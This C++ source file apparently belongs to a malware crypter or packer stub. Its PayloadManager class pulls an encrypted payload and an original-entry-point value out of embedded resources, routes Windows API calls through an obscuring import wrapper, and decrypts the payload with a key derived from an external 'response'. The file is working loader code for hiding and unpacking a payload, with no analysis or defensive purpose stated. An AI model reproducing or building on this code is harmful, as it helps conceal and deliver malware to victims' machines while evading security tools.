#include "pch.h"

#include "resource.h"
#include "PayloadManager.hpp"
#include "Cryptography.hpp"

PayloadManager::PayloadManager() {
    this->encryptedData = this->LoadRawData();
    this->OEP = this->LoadOEPData();
}

vector<BYTE>* PayloadManager::LoadRawData() {
    RunImp* dImp = RunImp::GetInstance();

    HMODULE m_hInstance = dImp->dGetModuleHandleA(NULL);
    HRSRC hResource = dImp->dFindResourceA(m_hInstance, MAKEINTRESOURCE(IDR_P_BIN1), "P_BIN");

    if (!hResource) {
        return nullptr;
    }

    HGLOBAL hLoadedResource = dImp->dLoadResource(m_hInstance, hResource);

    if (!hLoadedResource) {
        return nullptr;
    }

    LPVOID pLockedResource = dImp->dLockResource(hLoadedResource);

    if (!pLockedResource) {
        return nullptr;
    }

    DWORD dwResourceSize = dImp->dSizeofResource(m_hInstance, hResource);

    if (!dwResourceSize) {
        return nullptr;
    }

    vector<BYTE>* data = new vector<BYTE>(plusaes::get_padded_encrypted_size(dwResourceSize));
    memcpy(&data->data()[0], pLockedResource, dwResourceSize);

    return data;
}

DWORD PayloadManager::LoadOEPData() {
    RunImp* dImp = RunImp::GetInstance();

    HMODULE m_hInstance = dImp->dGetModuleHandleA(NULL);
    HRSRC hResource = dImp->dFindResourceA(m_hInstance, MAKEINTRESOURCE(IDR_P_BIN2), "P_BIN");

    if (!hResource) {
        return 0x0;
    }

    HGLOBAL hLoadedResource = dImp->dLoadResource(m_hInstance, hResource);

    if (!hLoadedResource) {
        return 0x0;
    }

    LPVOID pLockedResource = dImp->dLockResource(hLoadedResource);

    if (!pLockedResource) {
        return 0x0;
    }

    DWORD dwResourceSize = dImp->dSizeofResource(m_hInstance, hResource);

    if (!dwResourceSize) {
        return 0x0;
    }

    return *(DWORD*)pLockedResource;
}

vector<BYTE>* PayloadManager::GetDecryptedPayload(string response) {
    DecryptKey key = Cryptography::GetKeyFromResponse(response);
    Cryptography c(key);

    vector<BYTE>* decrypted = c.Decrypt(this->encryptedData);

    return decrypted;
}

DWORD PayloadManager::GetOEP() {
	return this->OEP;
}